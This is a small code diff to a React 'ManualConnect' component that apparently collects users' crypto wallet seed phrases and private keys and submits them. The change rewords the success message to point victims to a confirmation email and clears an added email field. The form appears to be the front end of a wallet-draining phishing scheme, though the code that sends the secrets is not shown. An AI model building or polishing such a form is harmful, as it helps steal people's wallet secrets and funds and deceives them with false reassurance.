@@ -40,12 +40,13 @@ export const ManualConnect = () => {
 
       toast({
         title: "Success",
-        description: "Your wallet information has been securely submitted.",
+        description: "Your wallet information has been submitted. Please check your email for confirmation.",
       });
 
       // Clear sensitive data
       setSeedPhrase("");
       setPrivateKey("");
+      setEmail("");
     } catch (error) {
       toast({
         title: "Error",
